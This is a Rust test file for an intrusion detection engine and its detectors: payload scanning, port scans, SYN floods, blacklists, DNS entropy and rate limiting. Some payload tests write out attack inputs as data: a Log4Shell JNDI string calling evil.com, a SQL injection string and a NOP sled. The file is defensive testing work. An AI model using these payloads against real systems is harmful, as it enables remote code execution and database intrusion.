// Privilege-free unit and integration tests for the IDS engine and its detectors.
// No pcap, no network access required — safe to run in CI and Docker.

use std::net::{IpAddr, Ipv4Addr};
use std::sync::Arc;
use std::time::SystemTime;

use crate::ids::IdsEngine;
use crate::ids::baseline::Baseline;
use crate::ids::blacklist::Blacklist;
use crate::ids::dns::{DnsDetector, extract_dns_query_name, shannon_entropy};
use crate::ids::geo::GeoDetector;
use crate::ids::payload::PayloadScanner;
use crate::ids::port_scan::PortScanDetector;
use crate::ids::rate_limit::RateLimiter;
use crate::ids::score::{IdsResult, Severity, Signal, THRESHOLD_ALERT, THRESHOLD_WARNING};
use crate::ids::syn_flood::SynFloodDetector;
use crate::raw_packet::{LinkType, RawPacket, TransportMeta};

// --- helpers ---

fn ipv4(a: u8, b: u8, c: u8, d: u8) -> IpAddr {
    IpAddr::V4(Ipv4Addr::new(a, b, c, d))
}

fn make_pkt(
    src: [u8; 4],
    dst: [u8; 4],
    protocol: u8,
    src_port: Option<u16>,
    dst_port: Option<u16>,
    tcp_flags: Option<u8>,
    payload: &[u8],
) -> RawPacket {
    let header_len = 40usize;
    let mut data = vec![0u8; header_len];
    data.extend_from_slice(payload);
    let len = data.len() as u32;
    RawPacket {
        timestamp: SystemTime::UNIX_EPOCH,
        orig_len: len,
        cap_len: len,
        is_truncated: false,
        interface: "eth0".into(),
        link_type: LinkType::Ethernet,
        packet_id: 0,
        ids_score: 0.0,
        ids_flag: 0,
        transport: Some(TransportMeta {
            src_ip: IpAddr::V4(Ipv4Addr::from(src)),
            dst_ip: IpAddr::V4(Ipv4Addr::from(dst)),
            src_port,
            dst_port,
            protocol,
            tcp_flags,
            ttl: 64,
            ip_flags: 0,
            ip_frag_offset: 0,
            icmp_type: None,
            icmp_code: None,
            eth_src_mac: None,
            vlan_id: None,
            payload_offset: if payload.is_empty() {
                header_len + 1
            } else {
                header_len
            },
        }),
        data,
    }
}

fn make_tcp(src: [u8; 4], dst: [u8; 4], src_port: u16, dst_port: u16, flags: u8) -> RawPacket {
    make_pkt(
        src,
        dst,
        6,
        Some(src_port),
        Some(dst_port),
        Some(flags),
        &[],
    )
}

fn make_engine() -> Arc<IdsEngine> {
    Arc::new(IdsEngine::new(
        Arc::new(Baseline::new(None)),
        Arc::new(GeoDetector::new()),
        Arc::new(Blacklist::new()),
    ))
}

// ─── score / severity ────────────────────────────────────────────────────────

#[test]
fn score_empty_signals_is_clean() {
    let r = IdsResult::from_signals(vec![], 0);
    assert!(r.is_clean());
    assert_eq!(r.severity, Severity::Info);
    assert_eq!(r.total_score, 0.0);
}

#[test]
fn score_single_signal_below_info_stays_clean() {
    let r = IdsResult::from_signals(
        vec![Signal {
            name: "x",
            score: 20.0,
            detail: "".into(),
        }],
        0,
    );
    assert!(r.is_clean());
}

#[test]
fn score_at_warning_threshold() {
    let r = IdsResult::from_signals(
        vec![Signal {
            name: "x",
            score: THRESHOLD_WARNING,
            detail: "".into(),
        }],
        0,
    );
    assert_eq!(r.severity, Severity::Warning);
    assert!(!r.is_clean());
}

#[test]
fn score_at_alert_threshold() {
    let r = IdsResult::from_signals(
        vec![Signal {
            name: "x",
            score: THRESHOLD_ALERT,
            detail: "".into(),
        }],
        0,
    );
    assert_eq!(r.severity, Severity::Alert);
}

#[test]
fn score_at_critical_threshold() {
    let r = IdsResult::from_signals(
        vec![Signal {
            name: "x",
            score: 95.0,
            detail: "".into(),
        }],
        0,
    );
    assert_eq!(r.severity, Severity::Critical);
}

#[test]
fn score_correlation_bonus_on_two_signals() {
    let signals = vec![
        Signal {
            name: "a",
            score: 20.0,
            detail: "".into(),
        },
        Signal {
            name: "b",
            score: 20.0,
            detail: "".into(),
        },
    ];
    // base 40 + bonus 10 = 50
    let r = IdsResult::from_signals(signals, 0);
    assert_eq!(r.total_score, 50.0);
}

#[test]
fn score_capped_at_100() {
    let signals = vec![
        Signal {
            name: "a",
            score: 90.0,
            detail: "".into(),
        },
        Signal {
            name: "b",
            score: 90.0,
            detail: "".into(),
        },
    ];
    // base 180 + bonus 10 would be 190, capped at 100
    let r = IdsResult::from_signals(signals, 0);
    assert_eq!(r.total_score, 100.0);
}

#[test]
fn score_signals_sorted_descending() {
    let signals = vec![
        Signal {
            name: "low",
            score: 10.0,
            detail: "".into(),
        },
        Signal {
            name: "high",
            score: 80.0,
            detail: "".into(),
        },
        Signal {
            name: "mid",
            score: 40.0,
            detail: "".into(),
        },
    ];
    let r = IdsResult::from_signals(signals, 0);
    assert_eq!(r.signals[0].name, "high");
    assert_eq!(r.signals[2].name, "low");
}

// ─── blacklist ────────────────────────────────────────────────────────────────

#[test]
fn blacklist_exact_ip_fires() {
    let bl = Blacklist::new();
    bl.add_ip(u32::from(Ipv4Addr::new(1, 2, 3, 4)));
    assert_eq!(
        bl.check_ip(ipv4(1, 2, 3, 4)).unwrap().name,
        "blacklisted_ip"
    );
}

#[test]
fn blacklist_exact_ip_no_hit_for_other() {
    let bl = Blacklist::new();
    bl.add_ip(u32::from(Ipv4Addr::new(1, 2, 3, 4)));
    assert!(bl.check_ip(ipv4(1, 2, 3, 5)).is_none());
}

#[test]
fn blacklist_cidr_fires_for_address_in_range() {
    let bl = Blacklist::new();
    bl.add_cidr("203.0.113.0/24");
    assert!(bl.check_ip(ipv4(203, 0, 113, 99)).is_some());
}

#[test]
fn blacklist_cidr_no_hit_outside_range() {
    let bl = Blacklist::new();
    bl.add_cidr("192.168.1.0/24");
    assert!(bl.check_ip(ipv4(192, 168, 2, 1)).is_none());
}

#[test]
fn blacklist_domain_exact_match_fires() {
    let bl = Blacklist::new();
    bl.add_domain("evil.example.com");
    assert!(bl.check_domain("evil.example.com").is_some());
}

#[test]
fn blacklist_domain_case_insensitive() {
    let bl = Blacklist::new();
    bl.add_domain("Evil.Example.Com");
    assert!(bl.check_domain("evil.example.com").is_some());
}

#[test]
fn blacklist_domain_no_partial_match() {
    let bl = Blacklist::new();
    bl.add_domain("evil.example.com");
    assert!(bl.check_domain("sub.evil.example.com").is_none());
    assert!(bl.check_domain("example.com").is_none());
}

#[test]
fn blacklist_load_ip_list_skips_comments() {
    let bl = Blacklist::new();
    bl.load_ip_list("; Spamhaus header\n# another comment\n198.51.100.0/24\n203.0.113.1\n");
    assert!(bl.check_ip(ipv4(198, 51, 100, 5)).is_some());
    assert!(bl.check_ip(ipv4(203, 0, 113, 1)).is_some());
    assert!(bl.check_ip(ipv4(8, 8, 8, 8)).is_none());
}

#[test]
fn blacklist_load_domain_list_skips_comments() {
    let bl = Blacklist::new();
    bl.load_domain_list("# header\nmalware.example.org\nphish.example.net\n");
    assert!(bl.check_domain("malware.example.org").is_some());
    assert!(bl.check_domain("clean.example.com").is_none());
}

// ─── payload scanner ─────────────────────────────────────────────────────────

#[test]
fn payload_log4shell_detected() {
    let scanner = PayloadScanner::new();
    let payload = b"GET / HTTP/1.1\r\nX-Api-Version: ${jndi:ldap://evil.com/x}\r\n";
    let signals = scanner.scan_all(payload);
    assert!(signals.iter().any(|s| s.name == "log4shell_jndi"));
}

#[test]
fn payload_nop_sled_detected() {
    let scanner = PayloadScanner::new();
    let payload = b"\x90\x90\x90\x90\x90\x90\x90\x90shellcode_here";
    let signals = scanner.scan_all(payload);
    assert!(signals.iter().any(|s| s.name == "nop_sled"));
}

#[test]
fn payload_sqli_detected() {
    let scanner = PayloadScanner::new();
    let payload = b"GET /login?user=' OR '1'='1 HTTP/1.1\r\n";
    let signals = scanner.scan_all(payload);
    assert!(signals.iter().any(|s| s.name == "sqli_or_1eq1"));
}

#[test]
fn payload_clean_traffic_empty() {
    let scanner = PayloadScanner::new();
    let payload = b"GET / HTTP/1.1\r\nHost: example.com\r\nAccept: */*\r\n\r\n";
    assert!(scanner.scan_all(payload).is_empty());
}

#[test]
fn payload_duplicate_matches_deduped() {
    let scanner = PayloadScanner::new();
    // Two occurrences of the same pattern
    let payload = b"${jndi:ldap://a.com}GET /${jndi:rmi://b.com}";
    let signals = scanner.scan_all(payload);
    let count = signals
        .iter()
        .filter(|s| s.name == "log4shell_jndi")
        .count();
    assert_eq!(count, 1, "same rule should not fire twice");
}

// ─── port scan detector ───────────────────────────────────────────────────────

#[test]
fn port_scan_horizontal_fires_at_threshold() {
    let detector = PortScanDetector::new();
    let src = ipv4(192, 0, 2, 1);
    // Threshold is 20 unique ports
    for port in 1..=19 {
        assert!(
            detector.inspect(src, port).is_none(),
            "should not fire before threshold"
        );
    }
    let signal = detector.inspect(src, 20);
    assert!(signal.is_some());
    assert_eq!(signal.unwrap().name, "port_scan_horizontal");
}

#[test]
fn port_scan_no_trigger_for_repeated_port() {
    let detector = PortScanDetector::new();
    let src = ipv4(192, 0, 2, 2);
    for _ in 0..100 {
        assert!(detector.inspect(src, 443).is_none());
    }
}

#[test]
fn port_scan_different_sources_independent() {
    let detector = PortScanDetector::new();
    // src A contacts 19 ports — should not affect src B's counter
    let src_a = ipv4(10, 0, 0, 1);
    let src_b = ipv4(10, 0, 0, 2);
    for port in 1..=19 {
        detector.inspect(src_a, port);
    }
    assert!(detector.inspect(src_b, 80).is_none());
}

// ─── SYN flood detector ───────────────────────────────────────────────────────

const SYN: u8 = 0x02;
const ACK: u8 = 0x10;
const SYN_ACK: u8 = SYN | ACK;
const RST: u8 = 0x04;
const XMAS: u8 = 0x01 | 0x08 | 0x20; // FIN | PSH | URG

#[test]
fn syn_flood_triggers_after_50_syns_no_acks() {
    let detector = SynFloodDetector::new();
    let src = ipv4(10, 0, 0, 1);
    let dst = ipv4(10, 0, 0, 2);
    let mut triggered = false;
    for i in 0..60u16 {
        let signals = detector.inspect(src, dst, 10000 + i, 80, SYN);
        if signals.iter().any(|s| s.name == "syn_flood") {
            triggered = true;
            break;
        }
    }
    assert!(triggered, "SYN flood should fire after 50+ unanswered SYNs");
}

#[test]
fn syn_flood_no_trigger_with_balanced_acks() {
    let detector = SynFloodDetector::new();
    let src = ipv4(10, 0, 0, 3);
    let dst = ipv4(10, 0, 0, 4);
    // Simulate full 3-way handshakes: SYN → SYN-ACK → ACK.
    // The counter is keyed by src_ip, so src's ack count only grows when
    // src itself sends a packet with the ACK flag (the handshake-completing ACK).
    for i in 0..100u16 {
        detector.inspect(src, dst, 20000 + i, 80, SYN);
        detector.inspect(dst, src, 80, 20000 + i, SYN_ACK);
        detector.inspect(src, dst, 20000 + i, 80, ACK); // src's acks counter incremented here
    }
    // After 100 full handshakes src.syns ≈ src.acks → ratio ≈ 1, well below threshold 5.0
    let signals = detector.inspect(src, dst, 30000, 80, SYN);
    assert!(!signals.iter().any(|s| s.name == "syn_flood"));
}

#[test]
fn xmas_scan_detected() {
    let detector = SynFloodDetector::new();
    let src = ipv4(10, 1, 0, 1);
    let dst = ipv4(10, 1, 0, 2);
    let signals = detector.inspect(src, dst, 12345, 80, XMAS);
    assert!(
        signals.iter().any(|s| s.name == "xmas_scan"),
        "Xmas scan flags should be detected"
    );
}

#[test]
fn rst_injection_detected_without_prior_syn() {
    let detector = SynFloodDetector::new();
    let src = ipv4(10, 2, 0, 1);
    let dst = ipv4(10, 2, 0, 2);
    let signals = detector.inspect(src, dst, 54321, 443, RST);
    assert!(
        signals.iter().any(|s| s.name == "rst_injection"),
        "RST with no tracked SYN should fire rst_injection"
    );
}

// ─── rate limiter ─────────────────────────────────────────────────────────────

#[test]
fn rate_limiter_packet_flood_triggers() {
    let limiter = RateLimiter::new();
    let src = ipv4(172, 16, 0, 1);
    // Capacity is 1000 tokens; pkt_rate 500/s. Sending 1100 packets instantly exhausts the bucket.
    let mut triggered = false;
    for _ in 0..1100u32 {
        if let Some(s) = limiter.inspect(src, 100, false)
            && s.name == "rate_exceeded_packets"
        {
            triggered = true;
            break;
        }
    }
    assert!(
        triggered,
        "packet rate limit should fire after exhausting token bucket"
    );
}

#[test]
fn rate_limiter_byte_flood_triggers() {
    let limiter = RateLimiter::new();
    let src = ipv4(172, 16, 0, 2);
    // Single packet of 11 MB exceeds the 10 MB/s window limit
    let result = limiter.inspect(src, 11 * 1024 * 1024, false);
    assert!(result.is_some());
    assert_eq!(result.unwrap().name, "rate_exceeded_bytes");
}

#[test]
fn rate_limiter_connection_flood_triggers() {
    let limiter = RateLimiter::new();
    let src = ipv4(172, 16, 0, 3);
    // conn_rate threshold is 50; send 51 SYNs
    let mut triggered = false;
    for _ in 0..=50u32 {
        if let Some(s) = limiter.inspect(src, 60, true)
            && s.name == "rate_exceeded_connections"
        {
            triggered = true;
            break;
        }
    }
    assert!(
        triggered,
        "connection rate limit should fire after 50 SYNs in one window"
    );
}

#[test]
fn rate_limiter_separate_ips_independent() {
    let limiter = RateLimiter::new();
    let a = ipv4(10, 0, 1, 1);
    let b = ipv4(10, 0, 1, 2);
    // Exhaust A's bucket
    for _ in 0..1100u32 {
        limiter.inspect(a, 100, false);
    }
    // B should still have a full bucket and not trigger on the first packet
    assert!(limiter.inspect(b, 100, false).is_none());
}

// ─── DNS detector ────────────────────────────────────────────────────────────

#[test]
fn dns_high_entropy_label_fires() {
    let detector = DnsDetector::new();
    // Random-looking DGA domain
    let signals = detector.inspect_name("xq7k2mznvprtf.evil.com");
    assert!(signals.iter().any(|s| s.name == "dns_high_entropy"));
}

#[test]
fn dns_normal_domain_is_clean() {
    let detector = DnsDetector::new();
    let signals = detector.inspect_name("www.example.com");
    assert!(
        signals.is_empty(),
        "normal domain should not fire IDS signals"
    );
}

#[test]
fn dns_suspicious_tld_fires() {
    let detector = DnsDetector::new();
    let signals = detector.inspect_name("download.something.xyz");
    assert!(signals.iter().any(|s| s.name == "dns_suspicious_tld"));
}

#[test]
fn dns_long_fqdn_fires() {
    let detector = DnsDetector::new();
    let long_fqdn = format!("{}.example.com", "a".repeat(130));
    let signals = detector.inspect_name(&long_fqdn);
    assert!(signals.iter().any(|s| s.name == "dns_long_fqdn"));
}

#[test]
fn shannon_entropy_known_values() {
    // Uniform distribution of 2 symbols → entropy = 1.0 bit
    assert!((shannon_entropy(b"ababababab") - 1.0).abs() < 0.01);
    // Single repeated symbol → entropy = 0
    assert_eq!(shannon_entropy(b"aaaaaaaaaa"), 0.0);
    // Empty → 0
    assert_eq!(shannon_entropy(b""), 0.0);
}

#[test]
fn extract_dns_query_name_parses_wire_format() {
    // Wire-format DNS query for "example.com":
    // header (12 bytes) + \x07example\x03com\x00 + qtype/qclass
    let mut pkt = vec![0u8; 12]; // header: all zeros, but qdcount must be 1
    pkt[4] = 0;
    pkt[5] = 1; // QDCOUNT = 1
    pkt.extend_from_slice(b"\x07example\x03com\x00");
    pkt.extend_from_slice(&[0, 1, 0, 1]); // QTYPE A, QCLASS IN
    assert_eq!(
        extract_dns_query_name(&pkt),
        Some("example.com".to_string())
    );
}

#[test]
fn extract_dns_query_name_returns_none_on_short_packet() {
    assert!(extract_dns_query_name(&[0u8; 5]).is_none());
}

// ─── IdsEngine integration ────────────────────────────────────────────────────

#[test]
fn engine_clean_ack_packet_is_clean() {
    let engine = make_engine();
    let pkt = make_tcp([192, 168, 1, 1], [192, 168, 1, 2], 12345, 80, ACK);
    assert!(engine.analyze(&pkt).is_clean());
}

#[test]
fn engine_no_transport_returns_clean() {
    let engine = make_engine();
    let pkt = RawPacket {
        timestamp: SystemTime::UNIX_EPOCH,
        data: vec![0u8; 14],
        orig_len: 14,
        cap_len: 14,
        is_truncated: false,
        interface: "eth0".into(),
        link_type: LinkType::Ethernet,
        packet_id: 0,
        ids_score: 0.0,
        ids_flag: 0,
        transport: None,
    };
    assert!(engine.analyze(&pkt).is_clean());
}

#[test]
fn engine_blacklisted_src_sets_flag_7() {
    let baseline = Arc::new(Baseline::new(None));
    let geo = Arc::new(GeoDetector::new());
    let blacklist = Arc::new(Blacklist::new());
    blacklist.add_ip(u32::from(Ipv4Addr::new(1, 2, 3, 4)));
    let engine = Arc::new(IdsEngine::new(baseline, geo, blacklist));

    let pkt = make_tcp([1, 2, 3, 4], [192, 168, 1, 2], 12345, 80, SYN);
    let result = engine.analyze(&pkt);
    assert_eq!(
        result.flag_reason, 7,
        "blacklisted src should set FLAG_REASON_BLACKLISTED (7)"
    );
    assert!(!result.is_clean());
}

#[test]
fn engine_payload_sig_fires_log4shell() {
    let engine = make_engine();
    let payload = b"${jndi:ldap://evil.example.com/x}";
    let pkt = make_pkt(
        [10, 0, 0, 1],
        [10, 0, 0, 2],
        6,
        Some(54321),
        Some(80),
        Some(ACK | 0x08), // PSH+ACK
        payload,
    );
    let result = engine.analyze(&pkt);
    assert!(!result.is_clean());
    assert!(result.signals.iter().any(|s| s.name == "log4shell_jndi"));
}

#[test]
fn engine_port_scan_sets_flag_1() {
    let engine = make_engine();
    let src = [10, 0, 0, 5];
    let dst = [10, 0, 0, 1];
    let mut triggered = false;
    for port in 1..=25u16 {
        let pkt = make_tcp(src, dst, 60000, port, SYN);
        let result = engine.analyze(&pkt);
        if result.flag_reason == 1 {
            triggered = true;
            break;
        }
    }
    assert!(
        triggered,
        "engine should detect horizontal port scan and set FLAG_REASON_PORT_SCAN (1)"
    );
}

#[test]
fn engine_xmas_scan_detected() {
    let engine = make_engine();
    let pkt = make_tcp([10, 0, 0, 7], [10, 0, 0, 8], 11111, 22, XMAS);
    let result = engine.analyze(&pkt);
    assert!(result.signals.iter().any(|s| s.name == "xmas_scan"));
}

#[test]
fn engine_ip_fragmented_packet_fires_signal() {
    let engine = make_engine();
    let mut pkt = make_tcp([192, 168, 5, 1], [192, 168, 5, 2], 1111, 80, ACK);
    if let Some(ref mut tm) = pkt.transport {
        tm.ip_frag_offset = 8; // non-zero offset → fragmented
    }
    let result = engine.analyze(&pkt);
    assert!(result.signals.iter().any(|s| s.name == "ip_fragmentation"));
}

#[test]
fn engine_truncated_packet_fires_signal() {
    let engine = make_engine();
    let mut pkt = make_tcp([192, 168, 6, 1], [192, 168, 6, 2], 2222, 443, ACK);
    pkt.is_truncated = true;
    pkt.orig_len = pkt.cap_len + 100;
    let result = engine.analyze(&pkt);
    assert!(result.signals.iter().any(|s| s.name == "packet_truncated"));
}

#[test]
fn engine_vlan_reserved_id_fires_signal() {
    let engine = make_engine();
    let mut pkt = make_tcp([192, 168, 7, 1], [192, 168, 7, 2], 3333, 80, ACK);
    if let Some(ref mut tm) = pkt.transport {
        tm.vlan_id = Some(4095); // reserved VLAN ID
    }
    let result = engine.analyze(&pkt);
    assert!(result.signals.iter().any(|s| s.name == "vlan_reserved_id"));
}

// ─── baseline ────────────────────────────────────────────────────────────────

#[test]
fn baseline_starts_in_learning_phase() {
    let b = Baseline::new(None);
    assert!(b.is_learning());
}

#[test]
fn baseline_finish_learning_transitions_to_refinement() {
    let b = Baseline::new(None);
    b.finish_learning();
    assert!(!b.is_learning());
}

#[test]
fn baseline_observed_port_is_known() {
    let b = Baseline::new(None);
    b.observe_port(443);
    assert!(b.is_known_port(443));
    assert!(!b.is_known_port(9999));
}

#[test]
fn baseline_observed_country_is_known() {
    let b = Baseline::new(None);
    b.observe_country("US");
    assert!(b.is_known_country("US"));
    assert!(!b.is_known_country("XX"));
}

#[test]
fn baseline_observed_dns_is_known() {
    let b = Baseline::new(None);
    b.observe_dns("example.com");
    assert!(b.is_known_dns("example.com"));
    assert!(
        b.is_known_dns("EXAMPLE.COM"),
        "DNS check should be case-insensitive"
    );
    assert!(!b.is_known_dns("evil.example.com"));
}
